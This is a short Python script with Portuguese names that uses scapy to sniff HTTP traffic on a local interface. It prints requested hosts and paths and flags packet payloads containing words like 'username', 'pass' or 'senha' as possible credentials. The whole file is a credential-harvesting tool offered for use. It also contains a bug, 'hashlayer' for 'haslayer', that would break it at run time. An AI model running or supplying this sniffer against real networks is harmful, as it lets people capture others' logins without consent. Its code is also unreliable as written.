
import scapy.all as scapy

from scapy.layers import http

def sniffing(interface):
    scapy.sniff(iface=interface,store=False,prn=processar_pacote)

def processar_pacote(pacote):
    if pacote.haslayer(http.HTTPRequest):
        print('requisiscao: ' + str(pacote[http.HTTPRequest].Host)+str(pacote[http.HTTPRequest].Path))

        if pacote.hashlayer(scapy.Raw):
            conteudo = str(pacote[scapy.Raw].load)
            palavras_de_interesse = ["username", "user", "pass", "password", "email", "email", "senha", "usuario"]

            for palavra in palavras_de_interesse:
                if palavra in conteudo:
                    print("Possivel usuario e senha: "+ str(conteudo))
                    break

sniffing('Ethernet')